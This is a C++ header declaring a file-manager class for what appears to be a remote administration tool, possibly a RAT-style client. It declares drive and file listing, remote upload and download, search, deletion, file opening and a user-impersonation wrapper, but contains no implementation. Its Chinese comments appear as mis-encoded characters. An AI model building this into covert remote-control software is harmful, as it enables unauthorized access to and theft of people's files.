// FileManager.h: interface for the CFileManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_FILEMANAGER_H__359D0039_E61F_46D6_86D6_A405E998FB47__INCLUDED_)
#define AFX_FILEMANAGER_H__359D0039_E61F_46D6_86D6_A405E998FB47__INCLUDED_
#include <winsock2.h>
#include <list>
#include <string>

#include "Manager.h"
using namespace std;

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

typedef struct 
{
	UINT	nFileSize;	// �ļ���С
	UINT	nSendSize;	// �ѷ��ʹ�С
}SENDFILEPROGRESS, *PSENDFILEPROGRESS;



typedef struct 
{
	char SearchFileName[100];
	char SearchPath[MAX_PATH];
	BOOL bEnabledSubfolder;
}FILESEARCH;

typedef struct 
{
	char lpExistingFileName[MAX_PATH]; //ԭ��ַ
	char lpNewFileName[MAX_PATH]; // Ŀ��Ŀ¼
	BOOL bIsCopy;
}FILEMOVE;


class CFileManager : public CManager
{
public:
	void OnReceive(LPBYTE lpBuffer, UINT nSize);
	UINT SendDriveList();
	CFileManager(CClientSocket *pClient);
	virtual ~CFileManager();
private:
	list <string> m_UploadList;
	UINT m_nTransferMode;
	char m_strCurrentProcessFileName[MAX_PATH]; // ��ǰ���ڴ�����ļ�
	__int64 m_nCurrentProcessFileLength; // ��ǰ���ڴ�����ļ��ĳ���
	HANDLE ImpersonateLoggedOnUserWrapper();
	bool MakeSureDirectoryPathExists(LPCTSTR pszDirPath);
	bool UploadToRemote(LPBYTE lpBuffer);
	bool FixedUploadList(LPCTSTR lpszDirectory);
	void StopTransfer();
	UINT SendFilesList(LPCTSTR lpszDirectory);


	HANDLE m_hWorkThread;
	BOOL bIsStopSearch;
	FILESEARCH filesearch;

	void StopSearchTheard();
	void SendSearchFilesList(LPCTSTR str);
	static void WINAPI FindFileThread(LPVOID lparam );
	void FindFileInDir(char* rootDir,char* searchfilename,BOOL bEnabledSubfolder);


	bool DeleteDirectory(LPCTSTR lpszDirectory);
	UINT SendFileSize(LPCTSTR lpszFileName);
	void SendFileData(LPBYTE lpBuffer);
	void CreateFolder(LPBYTE lpBuffer);
	void Rename(LPBYTE lpBuffer);
	int	SendToken(BYTE bToken);

	void CreateLocalRecvFile(LPBYTE lpBuffer);
	void SetTransferMode(LPBYTE lpBuffer);
	void GetFileData();
	void WriteLocalRecvFile(LPBYTE lpBuffer, UINT nSize);
	void UploadNext();
	bool OpenFile(LPCTSTR lpFile, INT nShowCmd);
};

#endif // !defined(AFX_FILEMANAGER_H__359D0039_E61F_46D6_86D6_A405E998FB47__INCLUDED_)
